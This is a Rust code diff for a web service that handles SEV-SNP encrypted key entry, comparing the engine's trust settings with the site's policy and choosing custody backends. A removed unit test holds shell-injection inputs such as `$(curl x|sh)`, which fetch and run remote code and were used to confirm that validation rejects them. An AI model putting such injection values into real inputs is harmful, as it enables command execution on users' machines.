@@ -25,7 +25,7 @@ use axum::extract::{Path, State};
 use axum::http::{header, HeaderMap, StatusCode};
 use axum::response::{IntoResponse, Response};
 
-use super::{AppState, Engine};
+use super::AppState;
 use crate::engine_client::{KeyBundleAnswer, StoreKeys};
 use crate::views::key_entry::{CliDownload, SnpKeyEntry, SnpReady};
 
@@ -87,103 +87,160 @@ pub enum Purpose<'a> {
 }
 
 /// The encrypted key entry for a form whose keys may go to `snp` (one of
-/// `backends`), or `None` when they can't. A bundle that can't be had is
-/// shown as why.
+/// `backends`, or every form while monokulo requires it), or `None` when
+/// they can't. A bundle that can't be had, or an engine whose trust
+/// settings aren't this site's, is shown as unavailable.
 pub async fn prepare(
     state: &AppState,
     purpose: Purpose<'_>,
     backends: &[String],
 ) -> Option<SnpKeyEntry> {
-    if !backends.iter().any(|b| takes_keys_encrypted(b)) {
+    let policy = state.settings.snp_entry.load();
+    if !policy.required && !backends.iter().any(|b| takes_keys_encrypted(b)) {
         return None;
+    }
+    let unavailable = || {
+        SnpKeyEntry::Unavailable(
+            "Encrypted key entry for SEV-SNP key storage isn't available right now. Try again in a minute; if it lasts, tell this site's operator."
+                .to_owned(),
+        )
+    };
+    let Some(trust) = policy.trust else {
+        tracing::warn!("encrypted key entry is off: no engine ID key to trust is set (key_custody.snp_entry_id_key)");
+        return Some(unavailable());
+    };
+    if let Some(why) = snp_unusable(state) {
+        tracing::warn!(reason = %why, "SEV-SNP key entry isn't offered");
+        return Some(unavailable());
     }
     let answer = match purpose {
         Purpose::Create => state.engine.client.create_key_bundle(SNP).await,
         Purpose::Move(sk) => state.engine.client.move_key_bundle(sk, SNP).await,
     };
-    Some(
-        match answer.map_err(|e| e.to_string()).and_then(|answer| {
-            let trust = checked_trust(&answer.trust)?;
-            Ok(ready_view(state, &answer, &trust))
-        }) {
-            Ok(ready) => SnpKeyEntry::Ready(Box::new(ready)),
-            Err(e) => {
-                tracing::warn!(error = %e, "couldn't get a key custody bundle from the engine");
-                SnpKeyEntry::Unavailable(
-                "Encrypted key entry for SEV-SNP key storage isn't available right now. Try again in a minute."
-                    .to_owned(),
-            )
+    Some(match answer {
+        Ok(answer) => SnpKeyEntry::Ready(Box::new(ready_view(
+            state,
+            &answer,
+            &trust,
+            policy.is_official(),
+        ))),
+        Err(e) => {
+            tracing::warn!(error = %e, "couldn't get a key custody bundle from the engine");
+            unavailable()
+        }
+    })
+}
+
+/// Why the `snp` backend can't take keys from this site's forms right now,
+/// or `None` when it can: monokulo's own policy is set, the engine's status
+/// is known, and the engine trusts exactly the images monokulo does.
+pub fn snp_unusable(state: &AppState) -> Option<String> {
+    let policy = state.settings.snp_entry.load();
+    let Some(ours) = policy.trust else {
+        return Some(
+            "this site has no engine ID key to trust (key_custody.snp_entry_id_key)".to_owned(),
+        );
+    };
+    match super::status_page::known_snp_trust(&state.engine) {
+        None => Some("the engine's status isn't known".to_owned()),
+        Some(None) => Some("the engine reports no SEV-SNP backend set up".to_owned()),
+        Some(Some(engine)) => {
+            let differences = trust_differences(&ours, &engine);
+            (!differences.is_empty()).then(|| {
+                differences
+                    .into_iter()
+                    .map(|(_, difference)| difference)
+                    .collect::<Vec<_>>()
+                    .join("; ")
+            })
+        }
+    }
+}
+
+/// How the engine's trust settings differ from monokulo's own: monokulo's
+/// setting and a phrase naming both, for each; empty when they agree.
+pub fn trust_differences(
+    ours: &key_custody::transport::TrustPolicy,
+    engine: &crate::engine_client::SnpTrustStatus,
+) -> Vec<(&'static str, String)> {
+    use crate::settings::{
+        KEY_CUSTODY_SNP_ENTRY_ID_KEY, KEY_CUSTODY_SNP_ENTRY_MIN_GUEST_SVN,
+        KEY_CUSTODY_SNP_ENTRY_MIN_TCB,
+    };
+    let mut differences = Vec::new();
+    if !engine
+        .id_key_digest
+        .trim()
+        .eq_ignore_ascii_case(&hex::encode(ours.id_key_digest))
+    {
+        differences.push((
+            KEY_CUSTODY_SNP_ENTRY_ID_KEY.key,
+            format!(
+                "the ID key: key_custody.snp_entry_id_key here is {}, the engine's key_custody.snp_trusted_id_key is {}",
+                hex::encode(ours.id_key_digest),
+                engine.id_key_digest.trim()
+            ),
+        ));
+    }
+    if engine.min_guest_svn != ours.min_guest_svn {
+        differences.push((
+            KEY_CUSTODY_SNP_ENTRY_MIN_GUEST_SVN.key,
+            format!(
+                "the minimum security version: key_custody.snp_entry_min_guest_svn here is {}, the engine's key_custody.snp_min_guest_svn is {}",
+                ours.min_guest_svn, engine.min_guest_svn
+            ),
+        ));
+    }
+    let engine_tcb = key_custody::transport::TcbFloor::parse(&engine.min_tcb);
+    if engine_tcb.as_ref().ok() != Some(&ours.min_tcb) {
+        let show = |text: String| {
+            if text.is_empty() {
+                "empty".to_owned()
+            } else {
+                text
             }
-        },
-    )
+        };
+        differences.push((
+            KEY_CUSTODY_SNP_ENTRY_MIN_TCB.key,
+            format!(
+                "the firmware floor: key_custody.snp_entry_min_tcb here is {}, the engine's key_custody.snp_min_tcb is {}",
+                show(ours.min_tcb.to_text()),
+                show(engine.min_tcb.trim().to_owned())
+            ),
+        ));
+    }
+    differences
+}
+
+/// The key custody backends a store may use from this site's forms: the
+/// engine's, the default first, less `snp` while [`snp_unusable`], and
+/// only `snp` while monokulo requires it.
+pub fn usable_custody_backends(state: &AppState) -> Vec<String> {
+    let required = state.settings.snp_entry.load().required;
+    let snp_ok = snp_unusable(state).is_none();
+    super::status_page::known_enabled_custody_backends(&state.engine)
+        .into_iter()
+        .filter(|backend| {
+            if takes_keys_encrypted(backend) {
+                snp_ok
+            } else {
+                !required
+            }
+        })
+        .collect()
 }
 
 /// The backends a new store's keys may go to from a form: its choices, or
-/// (no choice offered) the engine's default.
+/// (no choice offered) the first usable one.
 pub fn offered_backends(
-    engine: &Engine,
+    state: &AppState,
     choices: &[crate::views::connect::CustodyChoice],
 ) -> Vec<String> {
     if choices.is_empty() {
-        super::status_page::known_enabled_custody_backends(engine)
-            .into_iter()
-            .take(1)
-            .collect()
+        usable_custody_backends(state).into_iter().take(1).collect()
     } else {
         choices.iter().map(|c| c.backend.clone()).collect()
     }
-}
-
-/// The digest of the official engine ID key this monokulo was built with
-/// (`key-custody`'s own file): empty when the build has none.
-const OFFICIAL_ID_KEY_DIGEST: &str =
-    include_str!("../../../key-custody/src/official_id_key_digest.txt");
-
-/// The engine's trust answer after monokulo checked it. The engine (and the
-/// network between it and monokulo) is not trusted to say what goes into
-/// the page or a printed command: a digest must be 96 hex characters, a
-/// firmware floor four numbers, and whether the key is the official one is
-/// monokulo's own comparison with the digest it was built with.
-#[derive(Debug, PartialEq, Eq)]
-struct CheckedTrust {
-    /// Lowercase hex.
-    id_key_digest: String,
-    official: bool,
-    min_guest_svn: u32,
-    /// `bootloader,tee,snp,microcode`, or empty.
-    min_tcb: String,
-}
-
-fn checked_trust(trust: &crate::engine_client::KeyBundleTrust) -> Result<CheckedTrust, String> {
-    let digest = trust.id_key_digest.trim().to_ascii_lowercase();
-    if digest.len() != 96 || !digest.bytes().all(|b| b.is_ascii_hexdigit()) {
-        return Err("the engine's trusted ID key digest isn't 96 hex characters".to_owned());
-    }
-    let min_tcb = trust.min_tcb.trim();
-    let min_tcb = if min_tcb.is_empty() {
-        String::new()
-    } else {
-        let parts: Vec<u8> = min_tcb
-            .split(',')
-            .map(|part| part.trim().parse::<u8>())
-            .collect::<Result<_, _>>()
-            .map_err(|_| "the engine's firmware floor isn't four numbers".to_owned())?;
-        if parts.len() != 4 {
-            return Err("the engine's firmware floor isn't four numbers".to_owned());
-        }
-        parts
-            .iter()
-            .map(u8::to_string)
-            .collect::<Vec<_>>()
-            .join(",")
-    };
-    let official = OFFICIAL_ID_KEY_DIGEST.trim().to_ascii_lowercase();
-    Ok(CheckedTrust {
-        official: !official.is_empty() && official == digest,
-        id_key_digest: digest,
-        min_guest_svn: trust.min_guest_svn,
-        min_tcb,
-    })
 }
 
 /// `value` as one shell word: unchanged when it holds only characters no
@@ -200,7 +257,12 @@ fn shell_word(value: &str) -> String {
     }
 }
 
-fn ready_view(state: &AppState, answer: &KeyBundleAnswer, trust: &CheckedTrust) -> SnpReady {
+fn ready_view(
+    state: &AppState,
+    answer: &KeyBundleAnswer,
+    trust: &key_custody::transport::TrustPolicy,
+    official: bool,
+) -> SnpReady {
     let json = answer.bundle.to_string();
     let id = state.engine.key_bundles.insert(json.clone());
     let path = format!("/key-custody/bundles/{id}");
@@ -209,18 +271,17 @@ fn ready_view(state: &AppState, answer: &KeyBundleAnswer, trust: &CheckedTrust) 
         Some(base) => format!("{base}{path}"),
         None => "key-custody-bundle.json".to_owned(),
     };
+    let digest = hex::encode(trust.id_key_digest);
+    let min_tcb = trust.min_tcb.to_text();
     let mut command = format!("key-custody-cli seal --bundle {}", shell_word(&bundle_arg));
-    if !trust.official {
-        command.push_str(&format!(
-            " --trust-id-key {}",
-            shell_word(&trust.id_key_digest)
-        ));
+    if !official {
+        command.push_str(&format!(" --trust-id-key {}", shell_word(&digest)));
     }
     if trust.min_guest_svn > 0 {
         command.push_str(&format!(" --min-guest-svn {}", trust.min_guest_svn));
     }
-    if !trust.min_tcb.is_empty() {
-        command.push_str(&format!(" --min-tcb {}", shell_word(&trust.min_tcb)));
+    if !min_tcb.is_empty() {
+        command.push_str(&format!(" --min-tcb {}", shell_word(&min_tcb)));
     }
     let links = state.settings.cli_links.load();
     let release = cli_release();
@@ -228,12 +289,12 @@ fn ready_view(state: &AppState, answer: &KeyBundleAnswer, trust: &CheckedTrust) 
         bundle_json: json,
         bundle_path: path,
         bundle_is_file: public.is_none(),
-        trust_id_key: (!trust.official).then(|| trust.id_key_digest.clone()),
+        trust_id_key: (!official).then(|| digest.clone()),
         // The official key is the one built into the browser's checker: it
         // isn't told which key to trust then.
-        id_key_digest: (!trust.official).then(|| trust.id_key_digest.clone()),
+        id_key_digest: (!official).then(|| digest.clone()),
         min_guest_svn: trust.min_guest_svn,
-        min_tcb: trust.min_tcb.clone(),
+        min_tcb,
         command,
         version: release.version.to_owned(),
         downloads: release
@@ -303,37 +364,62 @@ fn downloads(template: &str, version: &str) -> Vec<CliDownload> {
         .collect()
 }
 
-/// The keys a form sent, in the form `backend` takes: refused, with what to
-/// do instead, when they came in the clear for a backend that takes them
-/// only encrypted (they are not sent on), or encrypted for one that takes
-/// them as they are. `backend` is `None` for the engine's default, which is
-/// taken from what is known of it.
+/// The backend a form's keys go to and the keys, in the form it takes.
+/// Refused, with what to do instead, when they came in the clear for a
+/// backend that takes them only encrypted (they are not sent on), or
+/// encrypted for one that takes them as they are, or for a backend this
+/// site doesn't offer now ([`usable_custody_backends`]). `backend` is
+/// `None` for the default: the first usable backend, named so the engine
+/// doesn't pick one this site wouldn't (`None` stays for an engine with a
+/// single plain backend, or one whose status isn't known).
 pub fn store_keys(
-    engine: &Engine,
+    state: &AppState,
     backend: Option<&str>,
     view_key_hex: &str,
     spend_pubkey_hex: &str,
     encrypted_keys: Option<&str>,
-) -> Result<StoreKeys, String> {
+) -> Result<(Option<String>, StoreKeys), String> {
+    let engine = &state.engine;
+    let required = state.settings.snp_entry.load().required;
     let encrypted = encrypted_keys
         .map(str::trim)
         .filter(|text| !text.is_empty());
-    // No backend named: the engine's default, from its status. A status
-    // listing no backends is an engine with a single plain one.
     let status_known = super::status_page::known_status_is_fresh(engine);
-    let backend = backend.map(str::to_owned).or_else(|| {
-        super::status_page::known_enabled_custody_backends(engine)
-            .into_iter()
-            .next()
-    });
-    if backend.is_none() && !status_known && encrypted.is_none() && !view_key_hex.trim().is_empty()
-    {
-        // The engine's default can't be known: it might take keys only
-        // encrypted, so typed ones aren't sent on.
-        return Err(
-            "The engine isn't answering, so this store's keys were not sent. Try again in a minute."
-                .to_owned(),
-        );
+    let not_answering =
+        "The engine isn't answering, so this store's keys were not sent. Try again in a minute.";
+    let backend = match backend {
+        Some(backend) => Some(backend.to_owned()),
+        None if !status_known => {
+            // The engine's default can't be known: it might take keys only
+            // encrypted, so typed ones aren't sent on.
+            if required || (encrypted.is_none() && !view_key_hex.trim().is_empty()) {
+                return Err(not_answering.to_owned());
+            }
+            None
+        }
+        // A status listing no backends is an engine with a single plain one.
+        None if super::status_page::known_enabled_custody_backends(engine).is_empty() => None,
+        None => Some(usable_custody_backends(state).into_iter().next().ok_or(
+            "No key storage can take this store's keys right now, so they were not sent. Try again later; if it lasts, tell this site's operator.",
+        )?),
+    };
+    match backend.as_deref() {
+        Some(backend) if takes_keys_encrypted(backend) => {
+            if let Some(why) = snp_unusable(state) {
+                tracing::warn!(reason = %why, "keys for SEV-SNP key storage refused");
+                return Err(
+                    "SEV-SNP key storage isn't available right now, so the keys were not sent. Try again later; if it lasts, tell this site's operator."
+                        .to_owned(),
+                );
+            }
+        }
+        _ if required => {
+            return Err(
+                "This site keeps stores' keys only in SEV-SNP key storage, and the keys were not sent. Choose SEV-SNP key storage."
+                    .to_owned(),
+            );
+        }
+        _ => {}
     }
     let encrypted_only = backend.as_deref().is_some_and(takes_keys_encrypted);
     if encrypted_only {
@@ -350,21 +436,27 @@ pub fn store_keys(
                     .to_owned(),
             );
         };
-        return Ok(StoreKeys {
-            encrypted_keys: Some(encrypted.to_owned()),
-            ..StoreKeys::default()
-        });
+        return Ok((
+            backend,
+            StoreKeys {
+                encrypted_keys: Some(encrypted.to_owned()),
+                ..StoreKeys::default()
+            },
+        ));
     }
     if encrypted.is_some() && backend.is_some() {
         return Err(
             "Encrypted keys are only for SEV-SNP key storage: enter the keys themselves for this one.".to_owned(),
         );
     }
-    Ok(StoreKeys {
-        view_key_hex: view_key_hex.trim().to_owned(),
-        spend_pubkey_hex: spend_pubkey_hex.trim().to_owned(),
-        encrypted_keys: encrypted.map(str::to_owned),
-    })
+    Ok((
+        backend,
+        StoreKeys {
+            view_key_hex: view_key_hex.trim().to_owned(),
+            spend_pubkey_hex: spend_pubkey_hex.trim().to_owned(),
+            encrypted_keys: encrypted.map(str::to_owned),
+        },
+    ))
 }
 
 /// `GET /key-custody/bundles/{id}`: a bundle handed out with a key entry
@@ -414,43 +506,6 @@ pub async fn module(headers: HeaderMap) -> Response {
 mod tests {
     use super::*;
 
-    fn trust(digest: &str, min_tcb: &str) -> crate::engine_client::KeyBundleTrust {
-        crate::engine_client::KeyBundleTrust {
-            id_key_digest: digest.to_owned(),
-            official: true,
-            min_guest_svn: 0,
-            min_tcb: min_tcb.to_owned(),
-        }
-    }
-
-    /// What the engine says is checked, not trusted: only well-formed values
-    /// reach the page and the command, and "official" is monokulo's own
-    /// comparison, whatever the engine claims.
-    #[test]
-    fn the_engines_trust_answer_is_checked_and_official_is_decided_here() {
-        let digest = "Ab".repeat(48);
-        let checked = checked_trust(&trust(&digest, " 1, 2,3,4")).unwrap();
-        assert_eq!(checked.id_key_digest, "ab".repeat(48));
-        assert_eq!(checked.min_tcb, "1,2,3,4");
-        assert_eq!(
-            checked.official,
-            OFFICIAL_ID_KEY_DIGEST.trim().eq_ignore_ascii_case(&digest),
-            "the engine's claim is ignored"
-        );
-        for (bad_digest, bad_tcb) in [
-            (format!("{}$(curl x|sh)", "ab".repeat(45)), ""),
-            ("ab".repeat(47), ""),
-            ("ab".repeat(48), "10,0,23,213; curl x | sh"),
-            ("ab".repeat(48), "1,2,3"),
-            ("ab".repeat(48), "1,2,3,256"),
-        ] {
-            assert!(
-                checked_trust(&trust(&bad_digest, bad_tcb)).is_err(),
-                "{bad_digest} {bad_tcb}"
-            );
-        }
-    }
-
     #[test]
     fn command_words_are_quoted_unless_plainly_safe() {
         assert_eq!(
@@ -493,9 +548,13 @@ mod tests {
         assert_eq!(release(None, None).reference(), "main");
     }
 
+    use crate::settings::{MonokuloSettings, PerRequest, SnpEntryPolicy};
+    use key_custody::transport::{TcbFloor, TrustPolicy};
+
     fn status(
         backends: serde_json::Value,
         default: Option<&str>,
+        snp_trust: Option<serde_json::Value>,
     ) -> crate::engine_client::EngineStatusResponse {
         serde_json::from_value(serde_json::json!({
             "networks": [],
@@ -503,48 +562,195 @@ mod tests {
             "generated_at": 0,
             "key_custody": backends,
             "key_custody_default": default,
+            "key_custody_snp_trust": snp_trust,
         }))
         .unwrap()
     }
 
-    /// Typed keys go on only where the engine's default is known to take
-    /// them: refused while its status is unknown or its default is snp, sent
-    /// when it lists plain first, or no backends at all (a single plain one).
+    fn both_backends() -> serde_json::Value {
+        serde_json::json!([{ "backend": "plain", "error": null }, { "backend": "snp", "error": null }])
+    }
+
+    fn our_trust() -> TrustPolicy {
+        TrustPolicy {
+            id_key_digest: [0xAB; 48],
+            min_guest_svn: 2,
+            min_tcb: TcbFloor::parse("1,2,3,4").unwrap(),
+        }
+    }
+
+    fn engine_trust(digest: &str, min_guest_svn: u32, min_tcb: &str) -> serde_json::Value {
+        serde_json::json!({
+            "id_key_digest": digest,
+            "min_guest_svn": min_guest_svn,
+            "min_tcb": min_tcb,
+        })
+    }
+
+    fn matching_engine_trust() -> serde_json::Value {
+        engine_trust(&"ab".repeat(48), 2, "1,2,3,4")
+    }
+
+    /// A test state whose key entry policy is `trust`, required or not.
+    fn state_with_policy(trust: Option<TrustPolicy>, required: bool) -> AppState {
+        let mut state = AppState::for_tests();
+        state.settings = MonokuloSettings::fixed_with_snp_entry(
+            PerRequest {
+                signup_mode: crate::settings::SignupMode::Public,
+                public_url: String::new(),
+            },
+            SnpEntryPolicy { trust, required },
+        );
+        state
+    }
+
+    /// Typed keys go on only where the first usable backend is known to take
+    /// them: refused while the engine's status is unknown or its default is
+    /// snp, sent when it lists plain first, or no backends at all (a single
+    /// plain one).
     #[test]
     fn typed_keys_are_sent_only_where_the_default_takes_them() {
         let view = "07".repeat(32);
         let spend = "08".repeat(32);
-        let state = AppState::for_tests();
-        let engine = &state.engine;
-        assert!(store_keys(engine, None, &view, &spend, None)
+        let state = state_with_policy(Some(our_trust()), false);
+        assert!(store_keys(&state, None, &view, &spend, None)
             .unwrap_err()
             .contains("isn't answering"));
 
         super::super::status_page::seed_status_for_tests(
-            engine,
-            status(serde_json::json!([]), None),
+            &state.engine,
+            status(serde_json::json!([]), None, None),
         );
-        let keys = store_keys(engine, None, &view, &spend, None).unwrap();
-        assert_eq!(keys.view_key_hex, view);
+        let (backend, keys) = store_keys(&state, None, &view, &spend, None).unwrap();
+        assert_eq!((backend, keys.view_key_hex), (None, view.clone()));
 
         super::super::status_page::seed_status_for_tests(
-            engine,
-            status(
-                serde_json::json!([{ "backend": "plain", "error": null }, { "backend": "snp", "error": null }]),
-                Some("snp"),
-            ),
+            &state.engine,
+            status(both_backends(), Some("snp"), Some(matching_engine_trust())),
         );
-        assert!(store_keys(engine, None, &view, &spend, None)
+        assert!(store_keys(&state, None, &view, &spend, None)
             .unwrap_err()
             .contains("were not sent"));
-        assert!(store_keys(engine, Some("plain"), &view, &spend, None).is_ok());
+        assert!(store_keys(&state, Some("plain"), &view, &spend, None).is_ok());
+        let (backend, keys) = store_keys(&state, None, "", "", Some("{envelope}")).unwrap();
         assert_eq!(
-            store_keys(engine, None, "", "", Some("{envelope}"))
-                .unwrap()
-                .encrypted_keys
-                .as_deref(),
-            Some("{envelope}")
+            backend.as_deref(),
+            Some("snp"),
+            "named, not left to the engine"
         );
+        assert_eq!(keys.encrypted_keys.as_deref(), Some("{envelope}"));
+    }
+
+    /// The engine trusting other images than this site's policy takes snp
+    /// off the forms: it isn't a choice, keys for it are refused, and a store
+    /// whose engine default is snp goes to plain, named, instead.
+    #[test]
+    fn snp_is_not_offered_while_the_engine_trusts_other_images() {
+        let view = "07".repeat(32);
+        let spend = "08".repeat(32);
+        let state = state_with_policy(Some(our_trust()), false);
+        for (engine, differs_in) in [
+            (engine_trust(&"cd".repeat(48), 2, "1,2,3,4"), "the ID key"),
+            (
+                engine_trust(&"ab".repeat(48), 1, "1,2,3,4"),
+                "the minimum security version",
+            ),
+            (engine_trust(&"ab".repeat(48), 2, ""), "the firmware floor"),
+        ] {
+            super::super::status_page::seed_status_for_tests(
+                &state.engine,
+                status(both_backends(), Some("snp"), Some(engine.clone())),
+            );
+            let why = snp_unusable(&state).unwrap();
+            assert!(why.contains(differs_in), "{why}");
+            assert_eq!(usable_custody_backends(&state), vec!["plain".to_owned()]);
+            assert!(super::super::status_page::custody_choice_views(&state, None).is_empty());
+            assert!(store_keys(&state, Some("snp"), "", "", Some("{envelope}"))
+                .unwrap_err()
+                .contains("isn't available"));
+            let (backend, _) = store_keys(&state, None, &view, &spend, None).unwrap();
+            assert_eq!(backend.as_deref(), Some("plain"));
+        }
+
+        super::super::status_page::seed_status_for_tests(
+            &state.engine,
+            status(both_backends(), Some("snp"), Some(matching_engine_trust())),
+        );
+        assert_eq!(snp_unusable(&state), None);
+        assert_eq!(
+            usable_custody_backends(&state),
+            vec!["snp".to_owned(), "plain".to_owned()]
+        );
+    }
+
+    /// With encrypted entry required, keys in the clear never go anywhere,
+    /// even to an engine that says it has only plain; snp, when usable, is
+    /// the only choice.
+    #[test]
+    fn required_encrypted_entry_never_sends_typed_keys() {
+        let view = "07".repeat(32);
+        let spend = "08".repeat(32);
+        let state = state_with_policy(Some(our_trust()), true);
+        assert!(
+            store_keys(&state, None, "", "", Some("{envelope}")).is_err(),
+            "status unknown"
+        );
+        super::super::status_page::seed_status_for_tests(
+            &state.engine,
+            status(serde_json::json!([]), None, None),
+        );
+        assert!(store_keys(&state, None, &view, &spend, None)
+            .unwrap_err()
+            .contains("only in SEV-SNP"));
+        super::super::status_page::seed_status_for_tests(
+            &state.engine,
+            status(
+                both_backends(),
+                Some("plain"),
+                Some(matching_engine_trust()),
+            ),
+        );
+        assert_eq!(usable_custody_backends(&state), vec!["snp".to_owned()]);
+        assert!(store_keys(&state, Some("plain"), &view, &spend, None)
+            .unwrap_err()
+            .contains("only in SEV-SNP"));
+        let (backend, _) = store_keys(&state, None, "", "", Some("{envelope}")).unwrap();
+        assert_eq!(backend.as_deref(), Some("snp"));
+    }
+
+    /// The status page's alert: none while the two agree or snp isn't used,
+    /// what differs while they don't, and a required backend the engine
+    /// lacks.
+    #[test]
+    fn the_status_alert_names_what_differs() {
+        use super::super::status_page::snp_policy_alert;
+        let policy = SnpEntryPolicy {
+            trust: Some(our_trust()),
+            required: false,
+        };
+        let only_plain = status(
+            serde_json::json!([{ "backend": "plain", "error": null }]),
+            None,
+            None,
+        );
+        assert_eq!(snp_policy_alert(&policy, &only_plain), None);
+        let agreeing = status(both_backends(), None, Some(matching_engine_trust()));
+        assert_eq!(snp_policy_alert(&policy, &agreeing), None);
+        let other_key = status(
+            both_backends(),
+            None,
+            Some(engine_trust(&"cd".repeat(48), 2, "1,2,3,4")),
+        );
+        let alert = snp_policy_alert(&policy, &other_key).unwrap();
+        assert!(alert.contains("key_custody.snp_entry_id_key"), "{alert}");
+        assert!(alert.contains(&"cd".repeat(48)), "{alert}");
+        let required = SnpEntryPolicy {
+            required: true,
+            ..policy
+        };
+        assert!(snp_policy_alert(&required, &only_plain)
+            .unwrap()
+            .contains("no SEV-SNP backend"));
     }
 
     #[test]
